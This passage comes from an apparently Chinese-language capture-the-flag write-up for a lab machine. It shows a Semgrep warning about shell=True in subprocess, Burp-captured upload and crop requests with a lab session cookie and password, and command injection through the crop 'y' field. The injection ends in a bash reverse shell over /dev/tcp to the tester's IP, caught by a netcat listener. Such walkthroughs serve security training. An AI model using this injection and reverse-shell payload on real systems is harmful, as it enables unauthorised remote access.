           45┆ subprocess.run(command, capture_output=True,
               text=True, shell=True, check=True)          
   
   ❯❯❱ semgrep-rules.python.lang.security.audit.subprocess-shell-true
          ❰❰ Blocking ❱❱
          Found 'subprocess' function 'run' with 'shell=True'.  
          This is dangerous because this call will spawn the    
          command using a shell process. Doing so propagates    
          current shell settings and variables, which makes it  
          much easier for a malicious actor to execute commands.
          Use 'shell=False' instead.                            
                                                                
           ▶▶┆ Autofix ▶ False
           45┆ subprocess.run(command, capture_output=True,
               text=True, shell=True, check=True)          
</SNIP>
//会启动 shell，比如 /bin/sh -c "command"
```
### 上传图片，burpsuite拦截
#### 在网站上登录testuser@imagery.htb的密码为iambatman
```
POST /upload_image HTTP/1.1
Host: 10.129.13.194:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.13.194:8000/
Content-Type: multipart/form-data; boundary=----geckoformboundary6464b1ffefee15c9f868848e263b8363
Content-Length: 8875
Origin: http://10.129.13.194:8000
DNT: 1
Connection: keep-alive
Cookie: {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value; session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aaVcJw.bLj_Xuve7iySW4YNGxrvsrZ1ZPA
Sec-GPC: 1
Priority: u=0

------geckoformboundary6464b1ffefee15c9f868848e263b8363
Content-Disposition: form-data; name="title"

11
------geckoformboundary6464b1ffefee15c9f868848e263b8363
Content-Disposition: form-data; name="description"

adg
------geckoformboundary6464b1ffefee15c9f868848e263b8363
Content-Disposition: form-data; name="group_name"

My Images
------geckoformboundary6464b1ffefee15c9f868848e263b8363
Content-Disposition: form-data; name="file"; filename="gnome.jpg"
Content-Type: image/jpeg

ÿØÿà
```
#### 不是拦截download,而是下载后的My Images(1) ->Transform Image -> Operation:Crop
#### 拦截 ‘Apply Transformation'
```
POST /apply_visual_transform HTTP/1.1
Host: 10.129.13.194:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.13.194:8000/
Content-Type: application/json
Content-Length: 121
Origin: http://10.129.13.194:8000
DNT: 1
Connection: keep-alive
Cookie: {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value; session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aaVcJw.bLj_Xuve7iySW4YNGxrvsrZ1ZPA
Sec-GPC: 1
Priority: u=0

{"imageId":"f7857183-49c1-46f4-9ed7-6b258200f6b4","transformType":"crop","params":{"x":0,"y":0,"width":256,"height":256}}
```
#### 对y值进行测试
```
{"imageId":"f7857183-49c1-46f4-9ed7-6b258200f6b4","transformType":"crop","params":{"x":0,"y":"0；sleep 3;","width":256,"height":256}}
```
#### 对y值嵌入payload
```
[★]$ nc -lvnp 9000
listening on [any] 9000 ...

```
```
"y":"0;/bin/bash -c 'bin/bash -i >& /dev/tcp/10.10.15.132/9000 0>&1';",
```
#### URL 编码（Ctrl+U）

